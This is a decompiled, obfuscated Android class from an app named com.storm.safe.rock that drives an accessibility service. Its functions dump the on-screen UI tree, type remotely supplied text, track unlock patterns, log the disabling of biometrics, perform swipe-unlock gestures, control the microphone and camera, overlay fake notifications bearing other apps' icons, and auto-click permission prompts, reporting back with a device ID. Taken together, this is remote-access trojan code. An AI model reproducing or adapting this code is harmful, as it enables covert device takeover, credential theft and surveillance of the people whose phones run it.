package p000;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ResolveInfo;
import android.graphics.Point;
import android.graphics.Rect;
import android.graphics.drawable.Drawable;
import android.media.audiofx.NoiseSuppressor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.FrameLayout;
import com.storm.safe.rock.activity.htvekhdt;
import com.storm.safe.rock.hkdrkgzsfs;
import com.storm.safe.rock.manager.C0258a0;
import com.storm.safe.rock.manager.C0259a1;
import com.storm.safe.rock.manager.C0263a5;
import com.storm.safe.rock.manager.MicrophoneManager$AudioSource;
import com.storm.safe.rock.manager.MicrophoneManager$QualityMode;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0319a4;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.C0329b4;
import com.storm.safe.rock.service.modules.yw5xud.C0372a9;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.client.transports.PollingXHR;
import java.util.LinkedHashSet;
import java.util.Locale;
import kotlin.Pair;
import kotlin.Result;
import kotlin.collections.AbstractC0770a1;
import kotlin.text.Regex;
import org.json.JSONException;
import org.json.JSONObject;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class uz0 {

    /* renamed from: a0 */
    public final dqtvuisjd f60536a0;

    public /* synthetic */ uz0(dqtvuisjd dqtvuisjdVar) {
        this.f60536a0 = dqtvuisjdVar;
    }

    /* renamed from: a0 */
    public JSONObject m214864a0(int i) {
        int iWidth;
        int iHeight;
        dqtvuisjd dqtvuisjdVar = this.f60536a0;
        try {
            AccessibilityNodeInfo rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return null;
            }
            int[] iArr = {0};
            int[] iArr2 = {0};
            JSONObject jSONObjectM211423c4 = dqtvuisjd.m211423c4(rootInActiveWindow, 0, iArr, iArr2, i);
            Object systemService = dqtvuisjdVar.getSystemService("window");
            t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
            WindowManager windowManager = (WindowManager) systemService;
            if (Build.VERSION.SDK_INT >= 30) {
                Rect bounds = windowManager.getCurrentWindowMetrics().getBounds();
                t60.m214694b5(bounds, "windowManager.currentWindowMetrics.bounds");
                iWidth = bounds.width();
                iHeight = bounds.height();
            } else {
                Point point = new Point();
                windowManager.getDefaultDisplay().getRealSize(point);
                int i2 = point.x;
                int i3 = point.y;
                iWidth = i2;
                iHeight = i3;
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("root", jSONObjectM211423c4);
            jSONObject.put("timestamp", System.currentTimeMillis());
            jSONObject.put("screenWidth", iWidth);
            jSONObject.put("screenHeight", iHeight);
            jSONObject.put("totalElements", iArr2[0]);
            jSONObject.put("clickableElements", iArr[0]);
            return jSONObject;
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "UI分析失败", e);
            return null;
        }
    }

    /* renamed from: a1 */
    public void m214865a1(String str) {
        dqtvuisjd dqtvuisjdVar = this.f60536a0;
        LinkedHashSet linkedHashSet = dqtvuisjdVar.f52403d4;
        try {
            if (str != null) {
                linkedHashSet.remove(str);
                t60.m214714d6("dqtvuisjd", "🔐 [去重] 已移除图案: ".concat(str));
            } else {
                linkedHashSet.clear();
                t60.m214714d6("dqtvuisjd", "🔐 [去重] 已清除所有图案记录");
            }
            dqtvuisjdVar.m211512k8();
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 清除图案去重记录失败", e);
        }
    }

    /* renamed from: a2 */
    public C1496yx m214866a2() {
        C1496yx c1496yx = this.f60536a0.f52456i7;
        if (c1496yx != null) {
            return c1496yx;
        }
        return null;
    }

    /* renamed from: a3 */
    public C0319a4 m214867a3() {
        C0319a4 c0319a4 = this.f60536a0.f52437g8;
        if (c0319a4 != null) {
            return c0319a4;
        }
        return null;
    }

    /* renamed from: a4 */
    public fd0 m214868a4() {
        fd0 fd0Var = this.f60536a0.f52423f4;
        if (fd0Var != null) {
            return fd0Var;
        }
        return null;
    }

    /* renamed from: a5 */
    public C0323a8 m214869a5() {
        C0323a8 c0323a8 = this.f60536a0.f52415e6;
        return c0323a8 != null ? c0323a8 : C0323a8.f53097e0.getInstance();
    }

    /* renamed from: a6 */
    public C0263a5 m214870a6() {
        C0263a5 c0263a5 = this.f60536a0.f52370a1;
        if (c0263a5 != null) {
            return c0263a5;
        }
        return null;
    }

    /* renamed from: a7 */
    public void m214871a7(String str) {
        t60.m214695b6(str, "text");
        dqtvuisjd dqtvuisjdVar = this.f60536a0;
        if (dqtvuisjdVar.f52420f1 != null) {
            String strConcat = "远程输入文本: ".concat(str);
            AbstractC0770a1.m213614f9(new Pair("text", str), new Pair("length", Integer.valueOf(str.length())), new Pair("inputMethod", "system_helper"), new Pair("webUnlockMode", Boolean.FALSE));
            dqtvuisjd.m211435k0("TEXT_INPUT", strConcat);
            b60 b60Var = dqtvuisjdVar.f52420f1;
            if (b60Var == null) {
                t60.m214724f2("inputManager");
                throw null;
            }
            try {
                if (b60Var.m210552a7()) {
                    b60Var.m210556b6(str);
                } else {
                    b60Var.f45724a2.m215367a3(str);
                }
            } catch (Exception e) {
                t60.m214705c6("InputManager", "文本输入失败", e);
            }
            da0 da0Var = dqtvuisjdVar.f52421f2;
            if (da0Var != null) {
                da0Var.m212577a4((new Regex(".*[a-zA-Z].*").m213646a2(str) && new Regex(".*[0-9].*").m213646a2(str)) ? "mixed" : "unknown");
            }
        }
    }

    /* renamed from: a8 */
    public void m214872a8(String str) {
        t60.m214695b6(str, "error");
        t60.m214704c5("dqtvuisjd", "❌ 生物识别禁用失败: ".concat(str));
        dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
        this.f60536a0.m211514l1(str, false);
        AbstractC0770a1.m213614f9(new Pair("error", str), new Pair("timestamp", Long.valueOf(System.currentTimeMillis())));
        dqtvuisjd.m211435k0("BIOMETRIC", "禁用生物识别失败");
    }

    /* renamed from: a9 */
    public void m214873a9(int i, String str) {
        t60.m214714d6("dqtvuisjd", "🔐 进度[" + i + "]: " + str);
        AbstractC0770a1.m213614f9(new Pair("step", Integer.valueOf(i)), new Pair("message", str));
        dqtvuisjd.m211435k0("BIOMETRIC", "禁用生物识别进度");
    }

    /* renamed from: b0 */
    public void m214874b0() {
        t60.m214714d6("dqtvuisjd", "✅ 生物识别禁用成功");
        dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
        this.f60536a0.m211514l1("生物识别已临时禁用", true);
        AbstractC0770a1.m213614f9(new Pair("action", StringUtil.m212470a0("D3AiG28UKRF1GAR0NA5/ES8=")), new Pair("timestamp", Long.valueOf(System.currentTimeMillis())));
        dqtvuisjd.m211435k0("BIOMETRIC", "禁用生物识别成功");
    }

    /* renamed from: b1 */
    public void m214875b1() {
        dqtvuisjd dqtvuisjdVar = this.f60536a0;
        try {
            t60.m214714d6("dqtvuisjd", "⚙️ 打开当前应用的设置页面");
            t60.m214714d6("dqtvuisjd", "📦 应用包名: " + dqtvuisjdVar.getPackageName());
            Intent intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
            intent.setData(Uri.parse("package:" + dqtvuisjdVar.getPackageName()));
            intent.addFlags(268435456);
            intent.addFlags(8388608);
            ResolveInfo resolveInfoResolveActivity = dqtvuisjdVar.getPackageManager().resolveActivity(intent, 0);
            if (resolveInfoResolveActivity == null) {
                t60.m214704c5("dqtvuisjd", "❌ 系统不支持应用设置页面");
                return;
            }
            t60.m214714d6("dqtvuisjd", "✅ 找到处理Intent的Activity: " + resolveInfoResolveActivity.activityInfo.packageName);
            dqtvuisjdVar.startActivity(intent);
            t60.m214714d6("dqtvuisjd", "✅ 已启动应用设置页面");
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 打开应用设置页面失败", e);
        }
    }

    /* renamed from: b2 */
    public void m214876b2(int i) {
        this.f60536a0.performGlobalAction(i);
    }

    /* renamed from: b3 */
    public void m214877b3() throws InterruptedException {
        a30 a30Var = this.f60536a0.f52440h1;
        if (a30Var != null) {
            try {
                Pair pairM213572b9 = kj1.m213572b9(a30Var.f32a1);
                int iIntValue = ((Number) pairM213572b9.f57556a0).intValue();
                int iIntValue2 = ((Number) pairM213572b9.f57557a1).intValue();
                float f = iIntValue / 1.8f;
                Pair pair = iIntValue2 > 2400 ? new Pair(Float.valueOf(0.78f), Float.valueOf(0.12f)) : iIntValue2 > 2000 ? new Pair(Float.valueOf(0.75f), Float.valueOf(0.15f)) : new Pair(Float.valueOf(0.7f), Float.valueOf(0.2f));
                float f2 = iIntValue2;
                a30Var.m53a3(f, ((Number) pair.f57556a0).floatValue() * f2, f, f2 * ((Number) pair.f57557a1).floatValue(), 100L);
                Thread.sleep(300L);
            } catch (Exception e) {
                t60.m214705c6("GestureExecutor", "智能上滑解锁失败", e);
            }
        }
    }

    /* renamed from: b4 */
    public void m214878b4(String str) throws JSONException {
        t60.m214695b6(str, "requestId");
        t60.m214726f4("dqtvuisjd", "⚠️ 没有存储权限，启动权限请求");
        C0323a8 c0323a8 = this.f60536a0.f52415e6;
        if (c0323a8 != null) {
            String strM212470a0 = StringUtil.m212470a0("LVAdP3IqCT1HPiVKFA==");
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("requestId", str);
            jSONObject.put("error", "正在请求存储权限，请在弹出的对话框中授权后重试");
            jSONObject.put("needPermission", true);
            c0323a8.m211658c4(strM212470a0, jSONObject);
        }
        try {
            Context appContext = hkdrkgzsfs.f51942a0.getAppContext();
            if (appContext != null) {
                Intent intent = new Intent(appContext, (Class<?>) htvekhdt.class);
                intent.addFlags(268435456);
                appContext.startActivity(intent);
                t60.m214714d6("dqtvuisjd", "📂 已启动存储权限请求Activity");
            }
        } catch (Exception e) {
            tz0.m214808a8("❌ 启动权限请求Activity失败: ", e.getMessage(), "dqtvuisjd", e);
        }
    }

    /* renamed from: b5 */
    public void m214879b5(String str) {
        t60.m214695b6(str, "message");
        this.f60536a0.m211516l3(str);
    }

    /* renamed from: b6 */
    public void m214880b6(String str, boolean z) {
        dqtvuisjd dqtvuisjdVar = this.f60536a0;
        try {
            if (dqtvuisjdVar.f52415e6 != null) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
                jSONObject.put("enabled", z);
                jSONObject.put("message", str);
                jSONObject.put("timestamp", System.currentTimeMillis());
                jSONObject.put("deviceId", dqtvuisjdVar.m211470g4());
                dqtvuisjdVar.m211517l4(jSONObject);
                t60.m214702c3("dqtvuisjd", "📤 日志状态更新已发送: enabled=" + z + ", message=" + str);
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "发送日志状态更新失败", e);
        }
    }

    /* renamed from: b7 */
    public void m214881b7(String str) {
        MicrophoneManager$AudioSource microphoneManager$AudioSource;
        dqtvuisjd dqtvuisjdVar = this.f60536a0;
        try {
            String upperCase = str.toUpperCase(Locale.ROOT);
            t60.m214694b5(upperCase, "this as java.lang.String).toUpperCase(Locale.ROOT)");
            switch (upperCase.hashCode()) {
                case -2032180703:
                    if (!upperCase.equals("DEFAULT")) {
                        microphoneManager$AudioSource = MicrophoneManager$AudioSource.VOICE_RECOGNITION;
                        break;
                    } else {
                        microphoneManager$AudioSource = MicrophoneManager$AudioSource.DEFAULT;
                        break;
                    }
                case -1909881542:
                    if (!upperCase.equals("CAMCORDER")) {
                        microphoneManager$AudioSource = MicrophoneManager$AudioSource.VOICE_RECOGNITION;
                        break;
                    } else {
                        microphoneManager$AudioSource = MicrophoneManager$AudioSource.CAMCORDER;
                        break;
                    }
                case 76327:
                    if (!upperCase.equals("MIC")) {
                        microphoneManager$AudioSource = MicrophoneManager$AudioSource.VOICE_RECOGNITION;
                        break;
                    } else {
                        microphoneManager$AudioSource = MicrophoneManager$AudioSource.MIC;
                        break;
                    }
                case 1331256137:
                    if (!upperCase.equals("VOICE_COMMUNICATION")) {
                        microphoneManager$AudioSource = MicrophoneManager$AudioSource.VOICE_RECOGNITION;
                        break;
                    } else {
                        microphoneManager$AudioSource = MicrophoneManager$AudioSource.VOICE_COMMUNICATION;
                        break;
                    }
                default:
                    microphoneManager$AudioSource = MicrophoneManager$AudioSource.VOICE_RECOGNITION;
                    break;
            }
            C0259a1 c0259a1 = dqtvuisjdVar.f52455i6;
            if (c0259a1 == null) {
                t60.m214724f2("microphoneManager");
                throw null;
            }
            c0259a1.m211254a3(microphoneManager$AudioSource);
            t60.m214714d6("dqtvuisjd", "🎤 麦克风音频来源设置为: ".concat(str));
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "设置麦克风音频来源失败", e);
        }
    }

    /* renamed from: b8 */
    public void m214882b8(boolean z) throws IllegalStateException {
        try {
            C0259a1 c0259a1 = this.f60536a0.f52455i6;
            if (c0259a1 == null) {
                t60.m214724f2("microphoneManager");
                throw null;
            }
            c0259a1.f52106b2 = z;
            NoiseSuppressor noiseSuppressor = c0259a1.f52102a8;
            if (noiseSuppressor != null) {
                noiseSuppressor.setEnabled(z);
            }
            t60.m214714d6("dqtvuisjd", "🎤 麦克风降噪".concat(z ? "启用" : "禁用"));
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "设置麦克风降噪失败", e);
        }
    }

    /* renamed from: b9 */
    public void m214883b9(String str) {
        dqtvuisjd dqtvuisjdVar = this.f60536a0;
        try {
            String upperCase = str.toUpperCase(Locale.ROOT);
            t60.m214694b5(upperCase, "this as java.lang.String).toUpperCase(Locale.ROOT)");
            MicrophoneManager$QualityMode microphoneManager$QualityMode = upperCase.equals("HIGH") ? MicrophoneManager$QualityMode.HIGH : upperCase.equals("LOW") ? MicrophoneManager$QualityMode.LOW : MicrophoneManager$QualityMode.STANDARD;
            C0259a1 c0259a1 = dqtvuisjdVar.f52455i6;
            if (c0259a1 == null) {
                t60.m214724f2("microphoneManager");
                throw null;
            }
            if (c0259a1.f52097a3.get()) {
                t60.m214726f4("MicrophoneManager", "⚠️ 录音中无法更改音质模式，请先停止录音");
            } else {
                c0259a1.f52103a9 = microphoneManager$QualityMode;
            }
            t60.m214714d6("dqtvuisjd", "🎤 麦克风音质模式设置为: ".concat(str));
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "设置麦克风音质模式失败", e);
        }
    }

    /* renamed from: c0 */
    public void m214884c0(float f) {
        try {
            C0259a1 c0259a1 = this.f60536a0.f52455i6;
            if (c0259a1 == null) {
                t60.m214724f2("microphoneManager");
                throw null;
            }
            c0259a1.f52105b1 = AbstractC1117qo.m214412a8(f, 0.5f, 4.0f);
            t60.m214714d6("dqtvuisjd", "🎤 麦克风音量增益设置为: " + f + "x");
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "设置麦克风音量增益失败", e);
        }
    }

    /* renamed from: c1 */
    public void m214885c1(final String str, final String str2, final String str3, final String str4, final String str5) {
        Object objM213507a7;
        final dqtvuisjd dqtvuisjdVar = this.f60536a0;
        if (!Settings.canDrawOverlays(dqtvuisjdVar)) {
            t60.m214726f4("dqtvuisjd", "❌ 没有悬浮窗权限");
            return;
        }
        try {
            int i = Result.f57558a1;
            objM213507a7 = dqtvuisjdVar.getPackageManager().getApplicationIcon(dqtvuisjdVar.getPackageManager().getApplicationInfo(str, 0));
        } catch (Throwable th) {
            int i2 = Result.f57558a1;
            objM213507a7 = kg1.m213507a7(th);
        }
        if (objM213507a7 instanceof Result.Failure) {
            objM213507a7 = null;
        }
        final Drawable drawable = (Drawable) objM213507a7;
        new Handler(Looper.getMainLooper()).post(new Runnable() { // from class: qj1
            @Override // java.lang.Runnable
            public final void run() {
                Object objM213507a72;
                dqtvuisjd dqtvuisjdVar2 = dqtvuisjdVar;
                String str6 = str;
                String str7 = str2;
                String str8 = str3;
                String str9 = str4;
                String str10 = str5;
                Drawable drawable2 = drawable;
                dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
                try {
                    int i3 = Result.f57558a1;
                    WindowManager windowManager = dqtvuisjdVar2.f52482l3;
                    if (windowManager != null) {
                        windowManager.removeView(dqtvuisjdVar2.f52481l2);
                    }
                } catch (Throwable th2) {
                    int i4 = Result.f57558a1;
                    kg1.m213507a7(th2);
                }
                dqtvuisjdVar2.f52481l2 = null;
                dqtvuisjdVar2.f52482l3 = null;
                try {
                    Object systemService = dqtvuisjdVar2.getSystemService("window");
                    t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
                    WindowManager windowManager2 = (WindowManager) systemService;
                    FrameLayout frameLayoutM211441c5 = dqtvuisjdVar2.m211441c5(str6, str7, str8, str9, str10, drawable2, windowManager2);
                    WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
                    layoutParams.width = -1;
                    layoutParams.height = -2;
                    layoutParams.type = Build.VERSION.SDK_INT >= 26 ? 2038 : 2002;
                    layoutParams.flags = 264;
                    layoutParams.format = -3;
                    layoutParams.gravity = 49;
                    layoutParams.y = 50;
                    windowManager2.addView(frameLayoutM211441c5, layoutParams);
                    dqtvuisjdVar2.f52481l2 = frameLayoutM211441c5;
                    dqtvuisjdVar2.f52482l3 = windowManager2;
                    t60.m214714d6("dqtvuisjd", "🔔 通知已显示: ".concat(str7));
                    objM213507a72 = 0;
                } catch (Throwable th3) {
                    int i5 = Result.f57558a1;
                    objM213507a72 = kg1.m213507a7(th3);
                }
                Throwable thM213607a0 = Result.m213607a0(objM213507a72);
                if (thM213607a0 != null) {
                    t60.m214705c6("dqtvuisjd", "❌ 显示通知失败", thM213607a0);
                }
            }
        });
    }

    /* renamed from: c2 */
    public void m214886c2(int i) {
        C0372a9 c0372a9;
        C0329b4 c0329b4 = this.f60536a0.f52431g2;
        if (c0329b4 != null && (c0372a9 = c0329b4.f53199a4) != null) {
            c0372a9.f55152a9 = true;
            c0372a9.f55153b0 = (i * 1000) + System.currentTimeMillis();
            tz0.m214806a6("✅ [全局权限] 已启动，超时时间: ", i, "秒", c0372a9.f55148a5);
        }
        AbstractC0003a2.m44c5("✅ [全局权限] 已启动全局权限自动点击，超时: ", i, "秒", "dqtvuisjd");
    }

    /* renamed from: c3 */
    public void m214887c3() {
        dqtvuisjd dqtvuisjdVar = this.f60536a0;
        try {
            t60.m214714d6("dqtvuisjd", "📷 停止摄像头捕获");
            C0258a0 c0258a0 = dqtvuisjdVar.f52371a2;
            if (c0258a0 != null) {
                c0258a0.f52077b0 = false;
                c0258a0.f52086b9.set(false);
                c0258a0.f52085b8.clear();
                c0258a0.f52089c2 = null;
                C0258a0 c0258a02 = dqtvuisjdVar.f52371a2;
                if (c0258a02 == null) {
                    t60.m214724f2("cameraManager");
                    throw null;
                }
                c0258a02.m211248a7();
                t60.m214714d6("dqtvuisjd", "✅ 摄像头捕获已停止");
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 停止摄像头捕获失败", e);
        }
    }
}
